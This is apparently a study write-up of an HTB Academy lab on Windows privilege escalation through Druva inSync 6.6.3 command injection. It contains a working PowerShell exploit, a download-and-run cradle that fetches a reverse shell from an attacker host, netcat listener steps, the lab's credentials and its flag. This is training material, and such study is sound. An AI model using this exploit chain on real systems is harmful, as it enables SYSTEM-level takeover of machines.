# Vulnerable Services Privilege Escalation

## 🎯 Overview

**Vulnerable third-party services** provide privilege escalation opportunities even on well-patched systems. Users installing software or organizations using **vulnerable applications** create attack vectors. Many third-party services run with **SYSTEM privileges**, making them high-value targets for **local privilege escalation**.

## 🔍 Third-Party Software Enumeration

### Installed Programs Discovery
```cmd
# Enumerate installed applications
wmic product get name

# Example output with vulnerable software:
Name
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
VMware Tools
Druva inSync 6.6.3                    # ← Vulnerable version
Microsoft Update Health Tools
```

### Service Process Mapping
```cmd
# Check for running services on specific ports
netstat -ano | findstr 6064

# Expected output:
TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324

# Map process ID to running process
get-process -Id 3324

# Verify service details
get-service | ? {$_.DisplayName -like 'Druva*'}
```

## 💥 Druva inSync 6.6.3 Exploitation

### Vulnerability Details
```cmd
# CVE Information:
- Application: Druva inSync Client (backup/eDiscovery)
- Vulnerable Version: 6.6.3
- Service Context: NT AUTHORITY\SYSTEM
- Attack Vector: Command injection via RPC service
- Local Port: 6064
- Impact: Remote code execution as SYSTEM
```

### PowerShell Exploit PoC
```powershell
# Basic command injection template
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"    # ← Modify this command

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

## 🎯 HTB Academy Lab Solution

### Lab Environment
- **Target**: `10.129.223.93` (ACADEMY-WINLPE-WS01)
- **Credentials**: `htb-student:HTB_@cademy_stdnt!`
- **Access Method**: xfreerdp
- **Vulnerable Service**: Druva inSync 6.6.3 (running on port 6064)
- **Flag Location**: `C:\Users\Administrator\Desktop\VulServices\flag.txt`
- **Flag**: `Aud1t_th0se_th1rd_paRty_s3rvices!`

### Detailed Walkthrough

#### 1. Connect via RDP
```bash
# Connect to target using xfreerdp
xfreerdp /v:10.129.43.44 /u:htb-student /p:HTB_@cademy_stdnt!

# Expected output:
[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
```

#### 2. Enumerate Druva inSync Service
```powershell
# Open PowerShell and find process listening on port 6064
netstat -ano | findstr 6064

# Expected output:
TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3416
TCP    127.0.0.1:6064         127.0.0.1:55619        ESTABLISHED     3416
TCP    127.0.0.1:55619        127.0.0.1:6064         ESTABLISHED     3984
TCP    127.0.0.1:62905        127.0.0.1:6064         TIME_WAIT       0
TCP    127.0.0.1:62906        127.0.0.1:6064         TIME_WAIT       0

# Map process ID to running process (use PID from netstat output)
get-process -id 3416

# Expected output:
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    143       9     1420       6476              3416   0 inSyncCPHwnet64

# Verify Druva service is running
get-service | ? {$_.DisplayName -like 'Druva*'}

# Expected output:
Status   Name               DisplayName
------   ----               -----------
Running  inSyncCPHService   Druva inSync Client Service
```

#### 3. Prepare Attack Infrastructure on Pwnbox
```bash
# Download Invoke-PowerShellTcp.ps1 from GitHub and rename to shell.ps1
# Add this line at the bottom of shell.ps1:
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.80 -Port 9443

# Start Python HTTP server in same directory as shell.ps1
python3 -m http.server 8080

# Expected output:
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

#### 4. Configure Druva Exploit Script
```powershell
# On Windows target, use File Explorer to navigate to C:\Tools
# Edit Druva.ps1 script with Notepad
# Replace IP address and port with Pwnbox IP address

# The Druva.ps1 script should be modified to contain:
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.80:8080/shell.ps1')"
# (Replace 10.10.14.80 with your actual Pwnbox IP)
```

#### 5. Start Netcat Listener on Pwnbox
```bash
# Start listener on same port as specified in shell.ps1
nc -lvnp 9443

# Expected output:
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9443
Ncat: Listening on 0.0.0.0:9443
```

#### 6. Execute Druva Exploit
```powershell
# On Windows target, navigate to C:\Tools in PowerShell
cd C:\Tools

# Execute the Druva exploit script
.\Druva.ps1

# Expected output:
22
4
4
316
```

#### 7. Receive SYSTEM Shell
```bash
# On Pwnbox nc listener, you should receive connection:
Ncat: Connection from 10.129.43.44.
Ncat: Connection from 10.129.43.44:55778.
Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32>
```

#### 8. Access Flag
```powershell
# Verify SYSTEM privileges and access flag
whoami
# Should show: nt authority\system

# Access the flag file
type C:\Users\Administrator\Desktop\VulServices\flag.txt

# Flag: ...
```

## 🔄 Additional Vulnerable Services

### Common Third-Party Targets
```cmd
# High-risk applications often found in enterprise:
- Backup software (Druva, Veeam, etc.)
- Remote management tools (TeamViewer, VNC, etc.)
- Development tools (Git clients, IDEs, etc.)
- Database clients (MySQL Workbench, etc.)
- File sharing applications
- Antivirus/security software
```

### Service Discovery Methodology
```cmd
# 1. Software enumeration
wmic product get name
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion

# 2. Running services analysis
Get-Service | Where-Object {$_.Status -eq "Running"}
netstat -ano | findstr LISTENING

# 3. Process investigation
Get-Process | Where-Object {$_.ProcessName -notlike "System*"}

# 4. Vulnerability research
# Search for: "ApplicationName version CVE"
# Check exploit databases for PoC code
```

## ⚠️ Detection & Defense

### Detection Indicators
```cmd
# Monitor for:
- Unusual network connections to localhost high ports
- PowerShell execution with network download strings
- Service process spawning unexpected child processes
- Command injection patterns in application logs
```

### Defensive Measures
```cmd
# Security hardening:
- Restrict local administrator rights
- Implement application whitelisting
- Regular third-party software audits
- Patch management for all applications
- Network segmentation and monitoring
- PowerShell logging and monitoring
```

## 💡 Key Takeaways

1. **Third-party software** introduces significant attack surface
2. **Service enumeration** critical for identifying vulnerable applications
3. **Command injection** common in backup/management software
4. **SYSTEM context services** provide immediate privilege escalation
5. **PowerShell payloads** effective for fileless exploitation
6. **Application whitelisting** essential defensive measure

---

*Vulnerable services exploitation highlights the importance of comprehensive software inventory and patch management in enterprise environments.*
